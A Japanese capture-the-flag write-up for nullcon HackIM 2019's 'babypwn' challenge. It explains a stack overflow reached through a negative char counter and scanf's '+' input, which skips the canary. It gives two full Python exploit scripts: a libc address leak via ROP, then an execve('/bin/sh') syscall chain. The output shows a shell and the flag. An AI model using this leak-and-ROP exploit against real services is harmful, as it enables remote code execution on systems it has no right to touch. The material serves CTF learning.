# [pwn 495pts] babypwn - nullcon HackIM 2019
64ビットでSSP + Full RELROです。libcは配られていないようです。
```
$ checksec challenge
[*] 'challenge'
    Arch:       64 bits (little endian)
    NX:         NX enabled
    SSP:        SSP enabled (Canary found)
    RELRO:      Full RELRO
    PIE:        PIE disabled
```
IDAで解析しましょう。
まず、ヒープ上に作成された領域に名前を書き込めます。
この際ヒープ上には`"Tressure Box: hogehoge created!"`のようなデータが作成されます。
その後指定回数（最大20回）までint型の数値をスタック上の配列に書き込めます。
最初に生成された`"Tressure Box: hogehoge created!"`は最後にprintfでそのまま出力されるので、ここにFSBがあります。
最後に確保した領域がfreeで開放されます。

FSBを利用する際は入力したデータの前にいくらか文字列が追加されているので注意です。
それから名前をscanfで取っているため、64bitのアドレスは1度しか書き込めません。
スタックに積んだデータはFSBの際に使えます。
まず思い付いたのが、FSBでlibcのアドレスリークをして、かつfreeのGOTをmainに向ける方法ですが、今回はFull RELROなのでできません。

ここからしばらく悩んだのですが、コインの枚数に負数を入力するとたくさんデータが入れられました。
これはchar型で枚数を管理しているためで、例えば-1を入力すると255回データを入力できます。

また、scanfは`+`だけ入力するとメモリ上のデータはそのままになるので、canaryを破壊せずにリターンアドレスを書き換えることができます。
あとはputsでlibcのアドレスをリークして、mainに戻ってからROPすればよさそうです。
あれ、HackIM ShopもそうだったけどFormat String Exploitいらなくない？

```python
from ptrlib import *

elf = ELF("./challenge")
#sock = Process("./challenge")
sock = Socket("127.0.0.1", 4001)

addr_main = elf.symbol("main")
plt_puts = 0x4006b8
got_puts = elf.got("puts")
got_malloc = elf.got("malloc")
rop_pop_rdi = 0x00400a43
rop_pop_r15 = 0x00400a42

def write_addr(addr):
    global cnt
    sock.sendline(str(addr & 0xFFFFFFFF))
    sock.sendline(str(addr >> 32))
    cnt += 2

sock.recvline()
sock.sendline("y")
sock.recvuntil("name: ")
sock.sendline("ptr-yudai")
sock.recvline()

# Stack Overflow
sock.sendline("-128")
cnt = 0
for i in range(22):
    sock.sendline("0")
    cnt += 1
sock.sendline("+") # Stack
sock.sendline("+") #  Canary
cnt += 2
write_addr(0)

# leak <puts>
write_addr(rop_pop_rdi)
write_addr(got_puts)
write_addr(plt_puts)
# leak <malloc>
write_addr(rop_pop_rdi)
write_addr(got_malloc)
write_addr(plt_puts)

write_addr(addr_main)
for i in range(0x80 - cnt):
    sock.sendline("+")
sock.recvline()

addr1 = u64(sock.recvline().strip())
addr2 = u64(sock.recvline().strip())
dump("<puts> = " + hex(addr1))
dump("<malloc> = " + hex(addr2))
sock.interactive()
```

各種関数のアドレスがリークされた上、main関数へ処理が戻っています。
```
$ python solve.py
[+] Socket: Successfully connected to 127.0.0.1:4001
[ptrlib] <puts> = 0x7f26c98229c0
[ptrlib] <malloc> = 0x7f26c9839070
 [ptrlib]$ Create a tressure box?
^C[+] close: Connection to 127.0.0.1:4001 closed
```
libc databaseにアドレスを投げるとlibcのバージョンが特定できました。
あとは2周目で`system("/bin/sh")`を呼ぶだけです。

ローカルだとそれでOKだったのですが、本番のdocker環境でやるとなぜか2周目の`Create a tressure box?`のところで`Y`を入力する前に落ちてしまいます。
Ubuntuを立ち上げて調べたところ、leaveでrbpが0になってしまい、scanfでrbpを使ったときに死ぬことが分かりました。
なんでCentOS君では無事だったんだ.....

いろいろやっても駄目だったので、`main`の代わりに`_start`を呼び出すことで解決しました。

あと、rdiに`/bin/sh`のアドレス入れて呼び出してもubuntuだとシェルが起動しないんですよね。
ということで普通にROPしました。

```python
from ptrlib import *

elf = ELF("./challenge")
libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")
#sock = Process("./challenge")
sock = Socket("127.0.0.1", 4001)
#sock = Socket("192.168.1.19", 4002)

addr_start = elf.symbol("_start")
plt_puts = 0x4006b8
got_puts = elf.got("puts")
got_malloc = elf.got("malloc")
rop_pop_rdi = 0x00400a43
rop_pop_r15 = 0x00400a42

def write_addr(addr):
    global cnt
    sock.sendline(str(addr & 0xFFFFFFFF))
    sock.sendline(str(addr >> 32))
    cnt += 2

## round 1
sock.recvline()
sock.sendline("y")
sock.recvuntil("name: ")
sock.sendline("ptr-yudai")
sock.recvline()

# Stack Overflow
sock.sendline("-128")
cnt = 0
for i in range(20):
    sock.sendline("0")
    cnt += 1
for i in range(6):
    sock.sendline("+")
    cnt += 1

# leak <puts>
write_addr(rop_pop_rdi)
write_addr(got_puts)
write_addr(plt_puts)
# leak <malloc>
write_addr(rop_pop_rdi)
write_addr(got_malloc)
write_addr(plt_puts)
# call _start
write_addr(addr_start)
for i in range(0x80 - cnt):
    sock.sendline("+")
sock.recvline()

addr1 = u64(sock.recvline().strip())
addr2 = u64(sock.recvline().strip())
libc_base = addr1 - libc.symbol("puts")
addr_system = libc_base + libc.symbol("system")
addr_binsh = libc_base + next(libc.find("/bin/sh"))
dump("libc base = " + hex(libc_base))

## round 2
sock.recvline()
sock.sendline("y")
sock.recvuntil("name: ")
sock.sendline("ptr-yudai")
sock.recvline()

# Stack Overflow
sock.sendline("-128")
cnt = 0
for i in range(20):
    sock.sendline("0")
    cnt += 1
for i in range(6):
    sock.sendline("+")
    cnt += 1

rop_pop_rax = libc_base + 0x000439c7
rop_pop_rsi = libc_base + 0x00023e6a
rop_pop_rdx = libc_base + 0x00001b96
rop_syscall = libc_base + 0x000013c0

# call system("/bin/sh")
write_addr(rop_pop_rdi)
write_addr(addr_binsh)
write_addr(rop_pop_rsi)
write_addr(0)
write_addr(rop_pop_rdx)
write_addr(0)
write_addr(rop_pop_rax)
write_addr(59)
write_addr(rop_syscall)

for i in range(0x80 - cnt):
    sock.sendline("+")

sock.interactive()
```

できました。

```
$ python solve.py 
[+] Socket: Successfully connected to 127.0.0.1:4001
[ptrlib] libc base = 0x7ff98541c000
[ptrlib]$ Tressure Box: ptr-yudai created!

[ptrlib]$ ls
challenge
flag
[ptrlib]$ cat flag
hackim19{h0w_d1d_y0u_g37_th4t_c00k13?!!?}
[ptrlib]$
```

# 感想
scanfの`+`を使ってcanaryを通り越すのは面白いですね。
Stack Overflow系の問題としては割と良問だと思いました。
